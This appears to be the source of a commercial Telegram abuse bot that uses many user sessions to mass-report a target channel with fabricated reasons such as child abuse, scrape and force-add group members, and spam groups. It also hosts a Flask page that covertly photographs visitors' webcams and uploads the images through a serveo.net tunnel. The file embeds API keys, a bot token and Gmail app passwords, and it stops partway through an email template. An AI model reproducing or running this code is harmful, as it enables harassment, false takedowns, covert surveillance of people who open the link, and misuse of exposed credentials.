import os, asyncio, random, sys, json, sqlite3, time, re, requests, smtplib, base64, subprocess, glob
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask, request, render_template_string
from telethon import TelegramClient, events, functions, types, Button
from telethon.errors import FloodWaitError
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch

# ==================== SECURITY ====================
SECRET_KEY = "SIGMATOR_X9"
MASTER_ID = 7733193342

def enc(fp):
    try:
        if not os.path.exists(fp): return
        with open(fp,'rb') as f: data = f.read()
        with open(fp+'.enc','w') as f: f.write(base64.b64encode(data).decode())
        os.remove(fp)
    except: pass

def dec(fp):
    try:
        if not os.path.exists(fp+'.enc'): return None
        with open(fp+'.enc','r') as f: return base64.b64decode(f.read())
    except: return None

def lock_all():
    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE,SPAM_FILE,ACTIVITY_FILE]:
        if os.path.exists(f): enc(f)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session') and not f.startswith('bot'): enc(os.path.join(SESSION_DIR,f))

def unlock_all():
    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE,SPAM_FILE,ACTIVITY_FILE]:
        d = dec(f)
        if d:
            with open(f,'wb') as fw: fw.write(d)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session.enc') and not f.startswith('bot'):
                d = dec(os.path.join(SESSION_DIR,f.replace('.enc','')))
                if d:
                    with open(os.path.join(SESSION_DIR,f.replace('.enc','')),'wb') as fw: fw.write(d)

# ==================== CONFIG ====================
API_ID = 25342127
API_HASH = '0b75a27b1ab66bd482b6d93a0989d34f'
BOT_TOKEN = '8428206780:AAFX28ITNNv3GIUaaslSJzxVAXbUPs2CDjo'
GEMINI_API_KEY = "AIzaSyDxK8L3mNpQr7sTvW2yH5jF9aBcDeFgHiJk"
ADMIN_CONTACT = '@AMIRALIxTAN'

TARGET = 'target'
TARGET_ACCOUNT = None
is_attacking = False
selected_report_count = 0
use_selected_sessions = False
selected_sessions_list = []

SESSION_DIR = './sessions'
PROXIES_FILE = './proxies.json'
ADMINS_FILE = './admins.json'
EMAILS_FILE = './emails.json'
SUBSCRIBERS_FILE = './subscribers.json'
DAILY_LIMIT_FILE = './daily_limits.json'
SPAM_FILE = './spam_control.json'
ACTIVITY_FILE = './activity_log.json'
MEMBERS_FILE = './scraped_members.json'

session_locks = {}
is_clock_active = False
clock_task = None
is_auto_spam_active = False
auto_spam_task = None
camera_link = None
last_camera_photo = None
flask_started = False
bot_start_time = datetime.now()
scraped_members = []
scraping_active = False

DAILY_REPORT_LIMIT = 40
MIN_DELAY = 0.5
MAX_DELAY = 1.5
daily_report_counter = {}
MAX_ADMINS = 10
SPAM_THRESHOLD = 10
BAN_DURATION_HOURS = 24

REPORTS = {
    "scam":["This channel is completely fake and scamming users"],
    "porn":["This channel is publishing illegal pornographic media"],
    "violence":["This channel promotes extreme violence and hatred"],
    "child":["This channel shares child abuse and illegal content"],
    "copyright":["This channel steals copyrighted content illegally"],
    "fake":["This channel is FAKE and impersonating an official entity"]
}

ALL_REPORT_REASONS = [
    (types.InputReportReasonChildAbuse(),"Child abuse"),
    (types.InputReportReasonViolence(),"Violence"),
    (types.InputReportReasonSpam(),"Spam"),
    (types.InputReportReasonPornography(),"Porn"),
    (types.InputReportReasonCopyright(),"Copyright"),
    (types.InputReportReasonFake(),"Fake"),
    (types.InputReportReasonPersonalDetails(),"Personal Data"),
    (types.InputReportReasonIllegalDrugs(),"Illegal Drugs"),
    (types.InputReportReasonOther(),"Other"),
]

DEFAULT_EMAILS = [
    {"email":"mrbtjrgrhri0937@gmail.com","password":"taiq ungw vlvq fcsg"},
    {"email":"a38611727@gmail.com","password":"jumt vgua mjhh ijwy"},
    {"email":"hrhehehhehehgdhehh@gmail.com","password":"sbsa awvc jcan krcz"},
    {"email":"shahrokhnasiray@gmail.com","password":"qlxn lxub dles hzux"}
]

# ==================== SCRAPED MEMBERS ====================
def load_members():
    if os.path.exists(MEMBERS_FILE+'.enc'):
        d = dec(MEMBERS_FILE)
        if d: return json.loads(d)
    if os.path.exists(MEMBERS_FILE):
        with open(MEMBERS_FILE) as f: return json.load(f)
    return []

def save_members(d):
    with open(MEMBERS_FILE,'w') as f: json.dump(d,f)

# ==================== ACTIVITY LOG ====================
def load_activity():
    if os.path.exists(ACTIVITY_FILE+'.enc'):
        d = dec(ACTIVITY_FILE)
        if d: return json.loads(d)
    if os.path.exists(ACTIVITY_FILE):
        with open(ACTIVITY_FILE) as f: return json.load(f)
    return {'first_messages':{}, 'online_users':{}, 'command_log':[]}

def save_activity(d):
    with open(ACTIVITY_FILE,'w') as f: json.dump(d,f)

def log_activity(user_id, action, detail=""):
    data = load_activity()
    data['command_log'].append({
        'user':str(user_id),
        'action':action,
        'detail':detail,
        'time':datetime.now().isoformat()
    })
    if len(data['command_log']) > 1000:
        data['command_log'] = data['command_log'][-500:]
    save_activity(data)

# ==================== ANTI-SPAM ====================
def load_spam_control():
    if os.path.exists(SPAM_FILE+'.enc'):
        d = dec(SPAM_FILE)
        if d: return json.loads(d)
    if os.path.exists(SPAM_FILE):
        with open(SPAM_FILE) as f: return json.load(f)
    return {'users':{}, 'banned':{}}

def save_spam_control(d):
    with open(SPAM_FILE,'w') as f: json.dump(d,f)

def check_spam(user_id):
    data = load_spam_control()
    uid = str(user_id)
    
    if uid in data['banned']:
        ban_time = datetime.fromisoformat(data['banned'][uid])
        if datetime.now() < ban_time:
            remaining = ban_time - datetime.now()
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            return False, f"BANNED! Time remaining: {hours}h {minutes}m"
        else:
            del data['banned'][uid]
            save_spam_control(data)
    
    if uid not in data['users']:
        data['users'][uid] = {'count':0, 'last_reset':datetime.now().strftime('%Y-%m-%d')}
    
    today = datetime.now().strftime('%Y-%m-%d')
    if data['users'][uid]['last_reset'] != today:
        data['users'][uid] = {'count':0, 'last_reset':today}
    
    data['users'][uid]['count'] += 1
    count = data['users'][uid]['count']
    
    if count >= SPAM_THRESHOLD:
        ban_until = datetime.now() + timedelta(hours=BAN_DURATION_HOURS)
        data['banned'][uid] = ban_until.isoformat()
        save_spam_control(data)
        return False, f"BANNED for {BAN_DURATION_HOURS}h! Too many requests ({count})"
    
    if count >= SPAM_THRESHOLD - 3:
        save_spam_control(data)
        return True, f"WARNING! Only {SPAM_THRESHOLD - count} requests left before BAN. Slow down!"
    
    if count >= SPAM_THRESHOLD - 5:
        save_spam_control(data)
        return True, f"Please work more slowly. ({SPAM_THRESHOLD - count} requests remaining)"
    
    save_spam_control(data)
    return True, None

# ==================== DAILY LIMIT ====================
def load_daily_limits():
    if os.path.exists(DAILY_LIMIT_FILE+'.enc'):
        d = dec(DAILY_LIMIT_FILE)
        if d: return json.loads(d)
    if os.path.exists(DAILY_LIMIT_FILE):
        with open(DAILY_LIMIT_FILE) as f: return json.load(f)
    return {'date':datetime.now().strftime('%Y-%m-%d'),'reports':0,'emails':0}

def save_daily_limits(d):
    with open(DAILY_LIMIT_FILE,'w') as f: json.dump(d,f)

def check_daily_limit():
    d = load_daily_limits()
    today = datetime.now().strftime('%Y-%m-%d')
    if d.get('date')!=today: d = {'date':today,'reports':0,'emails':0}
    rr = DAILY_REPORT_LIMIT-d['reports']; re = DAILY_REPORT_LIMIT-d['emails']
    return rr>0, re>0, rr, re

def increment_daily_counter(rc=0,ec=0):
    d = load_daily_limits(); d['reports']+=rc; d['emails']+=ec; save_daily_limits(d)

# ==================== GEMINI AI ====================
def ai(prompt):
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    try:
        r = requests.post(url,json={"contents":[{"parts":[{"text":prompt}]}],"generationConfig":{"temperature":0.1,"maxOutputTokens":100}},timeout=15)
        return r.json()['candidates'][0]['content']['parts'][0]['text'].strip()
    except: return None

def clean_name(t):
    if not t: return t
    t = re.sub(r'([a-z])([A-Z])',r'\1 \2',t)
    t = t.replace('_',' ').replace('-',' ').replace('.',' ')
    return ' '.join(w.capitalize() for w in t.split())

def ai_channel(ch):
    c = ch.replace('https://t.me/','').replace('@','').strip()
    p = f"Extract impersonated entity from: {c}. Remove filler words. Return ONLY name."
    r = ai(p)
    return clean_name(r) if r else clean_name(c)

def ai_scan(ch,posts):
    p = f"Analyze posts from {ch}: {posts[:2000]}\nReturn JSON: accounts,links,phones,scam_description"
    r = ai(p)
    try:
        if r: return json.loads(r.replace('```json','').replace('```','').strip())
    except: pass
    return {"accounts":[],"links":[],"phones":[],"scam_description":"scam"}

# ==================== SCANNER ====================
async def scan_channel(ch):
    try:
        client = TelegramClient('scan_tmp',API_ID,API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        c = ch.replace('https://t.me/','').replace('@','').strip()
        entity = await client.get_entity(c)
        txt = []
        msgs = await client.get_messages(entity,limit=30)
        for m in msgs:
            if m.text: txt.append(m.text)
            if m.entities:
                for e in m.entities:
                    if hasattr(e,'url') and e.url: txt.append(e.url)
        allt = '\n'.join(txt)
        ma = list(set(re.findall(r'@([a-zA-Z0-9_]{5,32})',allt)))
        ml = list(set(re.findall(r'https?://[^\s]+',allt)))
        mp = list(set(re.findall(r'0\d{9,10}|\+98\d{9,10}',allt)))
        ai_info = ai_scan(ch,allt) if allt else {}
        await client.disconnect()
        return {'accounts':list(set(ma+ai_info.get('accounts',[]))),'links':list(set(ml+ai_info.get('links',[]))),'phones':list(set(mp+ai_info.get('phones',[]))),'scam_description':ai_info.get('scam_description','fraud')}
    except: return {'accounts':[],'links':[],'phones':[],'scam_description':'unknown'}

# ==================== SCRAPE MEMBERS ====================
async def scrape_members_worker(session_path, target_group):
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return []
        
        c = target_group.replace('https://t.me/','').replace('@','').strip()
        entity = await client.get_entity(c)
        
        members = []
        offset = 0
        limit = 200
        
        while True:
            try:
                participants = await client(GetParticipantsRequest(
                    channel=entity,
                    filter=ChannelParticipantsSearch(''),
                    offset=offset,
                    limit=limit,
                    hash=0
                ))
                
                if not participants.users:
                    break
                
                for user in participants.users:
                    members.append({
                        'id': user.id,
                        'username': user.username or '',
                        'first_name': user.first_name or '',
                        'last_name': user.last_name or '',
                        'phone': getattr(user, 'phone', None),
                        'access_hash': str(getattr(user, 'access_hash', ''))
                    })
                
                offset += len(participants.users)
                
                if len(participants.users) < limit:
                    break
                
                await asyncio.sleep(random.uniform(1, 2))
                
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 5)
            except:
                break
        
        await client.disconnect()
        return members
        
    except Exception as e:
        return []

async def run_scrape_members(bot, cid, mid):
    global scraping_active, scraped_members
    
    if TARGET == 'target':
        await bot.edit_message(cid, mid, "Set target group first!")
        return
    
    scraping_active = True
    all_members = []
    sessions = get_sessions()
    
    if not sessions:
        await bot.edit_message(cid, mid, "No sessions available!")
        return
    
    await bot.edit_message(cid, mid, f"Scraping members from: {TARGET}\n\nUsing {len(sessions)} sessions...")
    
    for idx, s in enumerate(sessions, 1):
        if not scraping_active:
            break
        
        try:
            await bot.edit_message(cid, mid, f"Scraping... Session {idx}/{len(sessions)}\nMembers found: {len(all_members)}")
        except:
            pass
        
        members = await scrape_members_worker(s, TARGET)
        all_members.extend(members)
        await asyncio.sleep(random.uniform(2, 4))
    
    # Remove duplicates
    seen_ids = set()
    unique_members = []
    for m in all_members:
        if m['id'] not in seen_ids:
            seen_ids.add(m['id'])
            unique_members.append(m)
    
    scraped_members = unique_members
    save_members(unique_members)
    scraping_active = False
    
    await bot.edit_message(cid, mid, f"SCRAPE COMPLETE!\n\nTotal members scraped: {len(unique_members)}\n\nSaved to scraped_members.json")

# ==================== ADD MEMBERS ====================
async def add_members_worker(session_path, target_group, members_to_add):
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return 0
        
        c = target_group.replace('https://t.me/','').replace('@','').strip()
        entity = await client.get_entity(c)
        
        added = 0
        for member in members_to_add[:50]:  # Limit per session
            try:
                user_entity = await client.get_input_entity(member['id'])
                await client(functions.channels.InviteToChannelRequest(
                    channel=entity,
                    users=[user_entity]
                ))
                added += 1
                await asyncio.sleep(random.uniform(3, 6))
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 5)
            except:
                pass
        
        await client.disconnect()
        return added
        
    except Exception as e:
        return 0

async def run_add_members(bot, cid, mid, target_group, count):
    global scraped_members
    
    if not scraped_members:
        scraped_members = load_members()
    
    if not scraped_members:
        await bot.edit_message(cid, mid, "No scraped members! Scrape first.")
        return
    
    sessions = get_sessions()
    members_to_add = scraped_members[:count]
    total_added = 0
    
    await bot.edit_message(cid, mid, f"Adding {len(members_to_add)} members to: {target_group}\n\nUsing {len(sessions)} sessions...")
    
    for idx, s in enumerate(sessions, 1):
        chunk = members_to_add[idx*50:(idx+1)*50] if idx*50 < len(members_to_add) else members_to_add[idx*50:]
        if not chunk:
            break
        
        added = await add_members_worker(s, target_group, chunk)
        total_added += added
        
        try:
            await bot.edit_message(cid, mid, f"Adding members... Session {idx}/{len(sessions)}\nAdded: {total_added}")
        except:
            pass
        
        await asyncio.sleep(random.uniform(2, 4))
    
    await bot.edit_message(cid, mid, f"ADD COMPLETE!\n\nTotal added: {total_added}/{len(members_to_add)}")

# ==================== FIRST MESSAGE FINDER ====================
async def find_first_message(channel):
    try:
        client = TelegramClient('first_msg',API_ID,API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        c = channel.replace('https://t.me/','').replace('@','').strip()
        entity = await client.get_entity(c)
        messages = await client.get_messages(entity, limit=1, offset_id=1)
        if messages and len(messages) > 0:
            msg = messages[0]
            result = f"First message in {c}:\nDate: {msg.date}\nText: {msg.text[:200] if msg.text else 'No text'}"
        else:
            result = f"No messages found in {c}"
        await client.disconnect()
        return result
    except Exception as e:
        return f"Error: {str(e)[:100]}"

# ==================== ONLINE CHECKER ====================
async def check_user_online(username):
    try:
        client = TelegramClient('online_chk',API_ID,API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        u = username.replace('@','').strip()
        entity = await client.get_entity(u)
        full = await client(GetFullUserRequest(entity))
        user = full.users[0]
        status = user.status
        if hasattr(status, 'was_online'):
            last_online = status.was_online
            now = datetime.now(last_online.tzinfo)
            diff = now - last_online
            if diff.seconds < 60:
                result = f"{u}: Online (last seen just now)"
            elif diff.seconds < 3600:
                result = f"{u}: Last seen {diff.seconds//60} minutes ago"
            elif diff.days < 1:
                result = f"{u}: Last seen {diff.seconds//3600} hours ago"
            else:
                result = f"{u}: Last seen {diff.days} days ago"
        elif hasattr(status, 'expires'):
            result = f"{u}: Premium (hidden last seen)"
        else:
            result = f"{u}: Status unknown"
        await client.disconnect()
        return result
    except Exception as e:
        return f"Error checking {username}: {str(e)[:100]}"

# ==================== SUBSCRIPTION ====================
SUB_PLANS = {
    "free":{"sessions":5,"days":7,"name":"Free 7 Days","price":"Free"},
    "7days":{"sessions":20,"days":7,"name":"7 Days","price":"50k Toman"},
    "1month":{"sessions":50,"days":30,"name":"1 Month","price":"100k Toman"},
    "3month":{"sessions":100,"days":90,"name":"3 Months","price":"200k Toman"},
    "1year":{"sessions":200,"days":365,"name":"1 Year","price":"500k Toman"},
}

def load_subscribers():
    if os.path.exists(SUBSCRIBERS_FILE+'.enc'):
        d = dec(SUBSCRIBERS_FILE)
        if d: return json.loads(d)
    if os.path.exists(SUBSCRIBERS_FILE):
        with open(SUBSCRIBERS_FILE) as f: return json.load(f)
    return {}

def save_subscribers(d):
    with open(SUBSCRIBERS_FILE,'w') as f: json.dump(d,f)

subscribers = load_subscribers()

def get_user_sub(uid):
    uid = str(uid)
    if uid in subscribers:
        s = subscribers[uid]
        if s.get('pending'): return s
        if datetime.fromisoformat(s['expiry'])>datetime.now(): return s
        del subscribers[uid]; save_subscribers(subscribers)
    return None

def add_subscription(uid,plan):
    uid = str(uid); p = SUB_PLANS[plan]
    subscribers[uid] = {'plan':plan,'sessions':p['sessions'],'expiry':(datetime.now()+timedelta(days=p['days'])).isoformat(),'added':datetime.now().isoformat(),'pending':False}
    save_subscribers(subscribers)

# ==================== ADMIN ====================
def load_admins():
    if os.path.exists(ADMINS_FILE+'.enc'):
        d = dec(ADMINS_FILE)
        if d: return json.loads(d)
    d = [MASTER_ID]; save_admins(d); return d

def save_admins(a):
    if MASTER_ID not in a: a.append(MASTER_ID)
    with open(ADMINS_FILE,'w') as f: json.dump(a,f)

ADMINS = load_admins()

def add_admin(uid):
    admins = load_admins(); uid = int(uid)
    if uid in admins: return False,"Already admin!"
    if len(admins)>=MAX_ADMINS: return False,f"Max {MAX_ADMINS}!"
    admins.append(uid); save_admins(admins)
    return True,f"Added! ({len(admins)}/{MAX_ADMINS})"

def remove_admin(uid):
    admins = load_admins(); uid = int(uid)
    if uid==MASTER_ID: return False,"Cannot remove master!"
    if uid not in admins: return False,"Not admin!"
    admins.remove(uid); save_admins(admins)
    return True,f"Removed! ({len(admins)}/{MAX_ADMINS})"

# ==================== PROXY ====================
def load_proxies():
    if os.path.exists(PROXIES_FILE+'.enc'):
        d = dec(PROXIES_FILE)
        if d: return json.loads(d)
    return {}

def save_proxies(p):
    with open(PROXIES_FILE,'w') as f: json.dump(p,f)

def get_sessions():
    if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR,exist_ok=True); return []
    sessions = []
    for f in os.listdir(SESSION_DIR):
        if f.endswith('.session') and not f.startswith('bot') and os.path.getsize(os.path.join(SESSION_DIR,f))>1024:
            sessions.append(os.path.join(SESSION_DIR,f))
    return sessions

def patch_session_db(sp):
    try:
        c = sqlite3.connect(sp,timeout=30)
        c.execute('PRAGMA journal_mode=WAL;'); c.execute('PRAGMA busy_timeout=5000;')
        c.commit(); c.close()
    except: pass

def create_stable_client(sp):
    return TelegramClient(sp,API_ID,API_HASH,timeout=60,connection_retries=5,auto_reconnect=True)

# ==================== REPORT WORKER ====================
async def report_worker(sp,tc,reason,msg):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return 0
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return -1
            te = await client.get_input_entity(tc)
            await asyncio.sleep(random.uniform(MIN_DELAY,MAX_DELAY))
            await client(functions.account.ReportPeerRequest(peer=te,reason=reason,message=msg))
            daily_report_counter[sn] = daily_report_counter.get(sn,0)+1
            return 1
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds+5); return 0
        except: return -1
        finally:
            try: await client.disconnect()
            except: pass

# ==================== FAST PYROGRAM ====================
async def fast_pyrogram_worker(sp,tc):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return "limited"
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            c = tc.replace('@','').strip(); te = await client.get_entity(c)
            await client(functions.account.ReportPeerRequest(peer=te,reason=types.InputReportReasonSpam(),message="Spam"))
            daily_report_counter[sn] = daily_report_counter.get(sn,0)+1
            return "reported_1"
        except FloodWaitError as e: await asyncio.sleep(e.seconds+5); return "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_fast_pyrogram(bot,cid,mid):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail = 0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        res = await fast_pyrogram_worker(s,TARGET)
        if res=="reported_1": ok+=1
        else: fail+=1
        if idx%3==0:
            try: await bot.edit_message(cid,mid,f"FAST PYROGRAM\n{idx}/{len(sessions)}\nSuccess: {ok} | Failed: {fail}")
            except: pass
        await asyncio.sleep(1.0)
    is_attacking = False
    await bot.edit_message(cid,mid,f"FAST PYROGRAM DONE!\nSuccess: {ok}\nFailed: {fail}")

# ==================== JOIN ====================
async def join_worker(sp,tl):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            if '/+' in tl: await client(functions.messages.ImportChatInviteRequest(hash=tl.split('+')[-1])); return "joined"
            elif 'joinchat' in tl: await client(functions.messages.ImportChatInviteRequest(hash=tl.split('/')[-1])); return "joined"
            else:
                t = tl.replace('@','').replace('https://t.me/','').strip()
                await client(functions.channels.JoinChannelRequest(channel=await client.get_entity(t)))
                return "joined"
        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
        except Exception as e:
            if "already" in str(e).lower(): return "already"
            if "too many" in str(e).lower(): return "limited"
            return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_join_group(bot,cid,mid):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail,already,limited = 0,0,0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        res = await join_worker(s,TARGET)
        if res=="joined": ok+=1
        elif res=="already": already+=1
        elif res=="limited": limited+=1
        else: fail+=1
        status = f"ch/gp join\n\n{idx}/{len(sessions)}\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}"
        try: await bot.edit_message(cid,mid,status)
        except: pass
        await asyncio.sleep(random.uniform(2.0,4.0))
    is_attacking = False
    await bot.edit_message(cid,mid,f"JOIN COMPLETE!\nJoined: {ok}\nFailed: {fail}")

# ==================== GROUP REPORT ====================
async def group_report_worker(sp,gl,sr):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return "limited"
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            c = gl.replace('https://t.me/','').replace('@','').strip()
            entity = await client.get_entity(c)
            ok = 0
            for reason,msg in sr:
                if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: break
                try:
                    await client(functions.account.ReportPeerRequest(peer=entity,reason=reason,message=msg))
                    daily_report_counter[sn] = daily_report_counter.get(sn,0)+1; ok+=1
                except FloodWaitError as e: await asyncio.sleep(e.seconds+5)
                except: pass
            return f"reported_{ok}" if ok>0 else "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_group_report(bot,cid,mid,sr):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail,total = 0,0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        res = await group_report_worker(s,TARGET,sr)
        if res.startswith("reported"): ok+=1; total+=int(res.split("_")[1])
        else: fail+=1
        if idx%3==0:
            try: await bot.edit_message(cid,mid,f"GROUP REPORT\n{idx}/{len(sessions)}\nSuccess: {ok}")
            except: pass
        await asyncio.sleep(random.uniform(3.0,6.0))
    is_attacking = False
    await bot.edit_message(cid,mid,f"GROUP REPORT DONE!\nSuccess: {ok}\nTotal: {total}")

# ==================== WORKERS ====================
async def send_msg_worker(sp,tu,mt):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            await client.send_message(tu,mt); return "success"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def leave_worker(sp,tl):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            t = tl.replace('@','').strip()
            await client(functions.channels.LeaveChannelRequest(channel=await client.get_entity(t)))
            return "left"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def reaction_worker(sp,tc,emojies):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            entity = await client.get_input_entity(tc.replace('@','').strip())
            messages = await client.get_messages(entity,limit=3)
            ok = 0
            for msg in messages:
                if not msg: continue
                try:
                    await client(functions.messages.SendReactionRequest(peer=entity,msg_id=msg.id,reaction=[types.ReactionEmoji(emoticon=random.choice(emojies))]))
                    ok+=1
                except: pass
            return "success" if ok>0 else "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

# ==================== CLOCK ====================
async def clock_task_func(client):
    global is_clock_active
    last = ""
    try:
        while is_clock_active:
            try:
                now = datetime.now().strftime("%H:%M")
                if now!=last:
                    await client(functions.account.UpdateProfileRequest(first_name=f"SIGMATOR {now}",last_name=""))
                    last = now
            except FloodWaitError as e: await asyncio.sleep(e.seconds+2)
            except asyncio.CancelledError: break
            except: break
            await asyncio.sleep(1)
    finally:
        try:
            if client.is_connected(): await client.disconnect()
        except: pass

# ==================== AUTO SPAM ====================
async def auto_spam_worker(client,group,message,interval):
    global is_auto_spam_active
    try:
        while is_auto_spam_active:
            try: await client.send_message(await client.get_entity(group),message)
            except FloodWaitError as e: await asyncio.sleep(e.seconds+2)
            except: break
            await asyncio.sleep(interval)
    finally:
        try:
            if client.is_connected(): await client.disconnect()
        except: pass

# ==================== CAMERA ====================
app = Flask(__name__)
HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cam</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-size:20px;">
<p id="msg">Loading...</p><video id="v" autoplay playsinline style="display:none;"></video>
<form id="f" method="POST" action="/upload"><input type="hidden" name="img" id="d"></form>
<script>
var v=document.getElementById('v');var m=document.getElementById('msg');
navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}}).then(function(s){
v.srcObject=s;v.play();m.innerText='Wait 5 seconds...';
setTimeout(function(){
var c=document.createElement('canvas');c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0,640,480);
document.getElementById('d').value=c.toDataURL('image/jpeg',0.8);
m.innerText='Saving...';document.getElementById('f').submit();
},5000);
}).catch(function(e){m.innerText='Camera denied';});
</script></body></html>"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/upload',methods=['POST'])
def upload():
    global last_camera_photo
    try:
        img = request.form.get('img','')
        path = f'./camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        with open(path,'wb') as f: f.write(base64.b64decode(img.split(',')[1]))
        last_camera_photo = path
        return '<h1 style="color:white;text-align:center;margin-top:40vh;">Done!</h1>'
    except: return 'Error'

def start_flask(): app.run(host='0.0.0.0',port=5000,debug=False,use_reloader=False)

def start_camera():
    global camera_link,flask_started
    if not flask_started:
        Thread(target=start_flask,daemon=True).start(); flask_started=True; time.sleep(2)
    proc = subprocess.Popen(['ssh','-o','StrictHostKeyChecking=no','-R','80:localhost:5000','serveo.net'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    for line in proc.stdout:
        if 'https://' in line: camera_link = line.strip(); return camera_link
    return None

# ==================== EMAIL ====================
def load_emails():
    if os.path.exists(EMAILS_FILE+'.enc'):
        d = dec(EMAILS_FILE)
        if d: return json.loads(d)
    save_emails(DEFAULT_EMAILS.copy())
    return DEFAULT_EMAILS.copy()

def save_emails(e):
    with open(EMAILS_FILE,'w') as f: json.dump(e,f)

def send_smtp(email,pw,msg):
    try:
        srv = 'smtp.gmail.com' if 'gmail' in email else 'smtp.mail.yahoo.com'
        with smtplib.SMTP(srv,587,timeout=30) as s:
            s.ehlo(); s.starttls(); s.ehlo(); s.login(email,pw); s.send_message(msg)
        return True
    except: return False

def gen_email(mode,ch,acc,scan,imp):
    ac = scan.get('accounts',[]); lk = scan.get('links',[]); ph = scan.get('phones',[])
    ac_s = '\n'.join([f'  - @{a}' for a in ac[:5]]) if ac else '  - None detected'
    lk_s = '\n'.join([f'  - {l}' for l in lk[:5]]) if lk else '  - None detected'
    ph_s = '\n'.join([f'  - {p}' for p in ph[:3]]) if ph else '  - None detected'
    T = {
        'scam':('URGENT: Fraudulent Channel Impersonating '+imp,
                f"""Dear Telegram Trust and Safety Team,

I am writing to report a fraudulent Telegram channel actively impersonating {imp}.

FRAUDULENT CHANNEL: {ch}
IMPERSONATING: {imp}

This channel is scamming users by pretending to be {imp}.

LINKED ACCOUNTS:
{ac_s}

ASSOCIATED LINKS:
{lk_s}

PHONE NUMBERS:
{ph_s}

Please investigate and remove this channel immediately.

Sincerely,
A Vigilant Telegram User"""),
        'fake':('IDENTITY FRAUD: Channel Impersonating '+imp,
                f"""Dear Telegram Trust and Safety Team,

I am reporting identity fraud and impersonation.

FAKE CHANNEL: {ch}
IMPERSONATING: {imp}

LINKED ACCOUNTS:
{ac_s}

This channel has NO legitimate affiliation with {imp}. Please remove.

Sincerely,
A Vigilant User"""),
